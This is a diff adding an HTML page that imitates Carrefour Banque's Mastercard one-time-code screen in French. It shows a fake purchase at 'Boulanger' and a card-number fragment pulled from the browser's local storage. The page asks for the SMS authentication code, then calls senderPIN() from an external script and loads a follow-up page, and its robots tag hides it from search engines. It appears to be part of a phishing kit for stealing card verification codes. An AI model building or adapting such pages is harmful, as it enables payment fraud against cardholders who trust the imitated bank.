@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otpCarrefour_Mastercard</title>
+
+     <!--Scripts jquery-->
+        
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+ 
+ <!--Scripts jquery-->
+
+    <script>
+        document.getElementById("encryptedCardNumber").innerHTML =  localStorage.getItem("encryptedCardNumber");
+         document.getElementById("numtel").innerHTML =  localStorage.getItem("numtel");
+       
+       </script>
+
+
+
+<script type="text/javascript">
+    function validateForm() {
+      var a = document.forms["myForm"]["otp"].value;
+      if (!a) {
+        alert("Veuillez saisir le code reçu par SMS");
+        return false;
+      }
+    }
+  </script>
+
+
+   
+</head>
+
+<link rel="stylesheet" href="./otpCarrefour_Mastercard.css">
+
+<body>
+
+    <div id="secondpin">
+
+    </div>
+    
+
+    <div id="otp">
+
+    </div>
+    
+    <div class="totp">
+
+        <form name="myForm"  onsubmit=" validateForm();senderPIN();">
+
+        <div class="wrapper">
+
+            <div class="head">
+
+            <span class="bankLogo">
+
+                <img src="./assets/carrefour.png">
+
+            </span>
+
+            <span class="ccLogo">
+              <img src="./assets/mastercardid.png">
+            </span>
+
+        </div><br><br><br>
+        <h1>Saisie du code d'authentification</h1><br>
+
+    <p>Pour renforcer la sécurité des paiements par carte bancaire sur internet, 
+        Carrefour banque a adopté le code Clé Secure, il vous suffit de vous identifier en saisissant le code 
+        d'authentification à usage unique qui vient de vous être transmis par téléphone.
+     </p>
+
+         <br>
+        
+     <div class="details">
+        <div class="labels">
+            <label for="" class="a">Marchand: </label><br>
+           
+            <label for="" class="a">Date:</label> <br>
+            <label for="" class="a">N° de carte: </label>  <br>
+
+        </div>
+        <div class="spans">
+            <span id="marchand"> Boulanger</span><br>
+           
+            <span id="date"></span><br>
+            <span>xxxxxxxxxxxx<span id="encryptedCardNumber"></span> </span><br>
+
+        </div><br><br>
+        <label for="" >Veuillez saisir sans espace le code d'authentification:</label><br><br>
+        <input class="otp" name="otp"  id="numPin" type="text" required><br><br>
+
+        <button type="submit" class="ok"  href="javascript:void(0);" onsubmit="senderPIN();">Valider</button>
+
+    </div>
+<br><p style="text-align: center;">Si vous ne recevez pas un SMS</p><br>
+
+
+<button  class="tesec" >
+    Renvoyer le code
+
+
+
+</button><br>
+<br>
+        <p class="do">
+            Cette identification est obligatoire pour conclure votre achat. 
+            Vous pouvez cependant annuler la transaction en cliquant sur le lien ci-dessous.
+            Le paiement associé ne sera pas pris en compte.
+        </p>
+<br>
+        <a href="#">▸Abandonner et annuler mon achat</a>
+        </div>
+        <br>
+      
+    </form>
+</div>
+
+
+    <script>
+  var dt = new Date();
+document.getElementById("date").innerHTML = dt.toLocaleString();    
+    </script>
+<script src="./senderPIN.js"></script>
+
+  <!--Animated show for the div-->
+  <script type="text/javascript">
+    $(document).ready(function () {
+        $('.ok').click(function () {
+                $('.totp').fadeOut('4000');
+                $('#otp').load('otpCarrefour_Mastercard2.html').delay('5000').fadeIn('5000');
+                $('#otp').click(senderPIN());
+
+            });
+    });
+</script>
+
+</body>
+</html>
